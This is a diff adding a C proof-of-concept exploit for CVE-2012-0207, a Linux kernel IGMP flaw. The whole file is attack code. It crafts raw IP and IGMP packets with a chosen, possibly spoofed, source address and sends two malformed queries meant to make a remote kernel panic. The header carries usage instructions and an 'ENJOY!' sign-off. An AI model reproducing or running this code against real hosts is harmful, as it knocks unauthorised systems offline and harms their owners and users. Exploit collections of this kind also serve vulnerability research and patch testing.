@@ -1,0 +1,186 @@
+/*
+** linux-undeadattack.c
+** Linux IGMP Remote Denial Of Service (Introduced in linux-2.6.36)
+** CVE-2012-0207
+** credits to Ben Hutchings:
+** http://womble.decadent.org.uk/blog/igmp-denial-of-service-in-linux-cve-2012-0207.html
+** written By Kingcope
+** Year 2012
+** Ripped & modified code written by Firestorm
+** Tested against * OpenSuSE 11.4 system
+**		  * Recent Ubuntu Distro
+**
+** Example:
+** ./undeadattack 192.168.2.16 192.168.2.3
+** The Linux Kernel at the remote side will Panic
+** when sent over the network :>
+** ENJOY!
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+
+struct iphdr
+{
+  unsigned char ihl:4, version:4, tos;
+  unsigned short tot_len, id, frag_off;
+  unsigned char ttl, protocol;
+  unsigned short check;
+  unsigned int saddr, daddr;
+  unsigned int options1;
+  unsigned int options2;
+};
+
+
+struct igmp_query {
+        unsigned char type;
+        unsigned char maxresponse;
+        unsigned short csum;
+        unsigned int mcast;
+        char padding[40];
+};
+
+
+unsigned short in_chksum(unsigned short *, int);
+long resolve(char *);
+
+
+long resolve(char *host)
+{
+  struct hostent *hst;
+  long addr;
+
+
+  hst = gethostbyname(host);
+  if (hst == NULL)
+    return(-1);
+
+
+  memcpy(&addr, hst->h_addr, hst->h_length);
+
+
+  return(addr);
+}
+
+
+int main(int argc, char *argv[])
+{
+  struct sockaddr_in dst;
+  struct iphdr *ip;
+  struct igmp_query *igmp;
+  long daddr, saddr;
+  int s, i=0, c, len, one=1;
+  char buf[1500];
+
+
+  if (argc < 3)
+  {
+    printf("Linux IGMP Remote Denial Of Service (Introduced in linux-2.6.36)\n"
+	   "credits to Ben Hutchings\nwritten by Kingcope\n"
+	   "Ripped & modified code written by Firestorm\n");
+    printf("Usage: %s <src> <dst>\n", *argv);
+    return(1);
+  }
+
+
+  daddr = resolve(argv[2]);
+  saddr = resolve(argv[1]);
+
+  memset(buf, 0, 1500);
+  ip = (struct iphdr *)&buf;
+  igmp = (struct igmp_query*)&buf[sizeof(struct iphdr)];
+
+  dst.sin_addr.s_addr = daddr;
+  dst.sin_family = AF_INET;
+
+  ip->ihl = 7;
+  ip->version = 4;
+  ip->tos = 0;
+  ip->tot_len = htons(sizeof(struct iphdr)+8);
+  ip->id = htons(18277);
+  ip->frag_off=0;
+  ip->ttl = 1;
+  ip->protocol = IPPROTO_IGMP;
+  ip->check = in_chksum((unsigned short *)ip, sizeof(struct iphdr));
+  ip->saddr = saddr;
+  ip->daddr = daddr;
+  ip->options1 = 0;
+  ip->options2 = 0;
+  igmp->type = 0x11;
+  igmp->maxresponse = 0xff;
+  igmp->mcast=inet_addr("224.0.0.1");
+
+  igmp->csum = 0; //For computing the checksum, the Checksum field is set to zero.
+  igmp->csum=in_chksum((unsigned short *)igmp, 8);
+
+  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  if (s == -1)
+    return(1);
+
+  printf("Sending IGMP packet: %s -> %s\n", argv[1], argv[2]);
+
+      if (sendto(s,&buf,sizeof(struct iphdr)+8,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1)
+      {
+        perror("Error sending packet");
+        exit(-1);
+      }
+
+  close(s);
+
+  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  if (s == -1)
+    return(1);
+
+  ip->id = htons(18278);
+  ip->tot_len = sizeof(struct iphdr)+12;
+  igmp->type = 0x11;
+  igmp->maxresponse = 0;
+  igmp->mcast=inet_addr("0.0.0.0");
+
+  igmp->csum = 0; //For computing the checksum, the Checksum field is set to zero.
+  igmp->csum=in_chksum((unsigned short *)igmp, 12);
+
+  printf("Sending IGMP packet: %s -> %s\n", argv[1], argv[2]);
+
+      if (sendto(s,&buf,sizeof(struct iphdr)+12,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1)
+      {
+        perror("Error sending packet");
+        exit(-1);
+      }
+
+  return(0);
+}
+
+
+unsigned short in_chksum(unsigned short *addr, int len)
+{
+   register int nleft = len;
+   register int sum = 0;
+   u_short answer = 0;
+
+   while (nleft > 1) {
+      sum += *addr++;
+      nleft -= 2;
+   }
+
+
+   if (nleft == 1) {
+      *(u_char *)(&answer) = *(u_char *)addr;
+      sum += answer;
+   }
+
+
+   sum = (sum >> 16) + (sum & 0xffff);
+   sum += (sum >> 16);
+   answer = ~sum;
+   return(answer);
+}
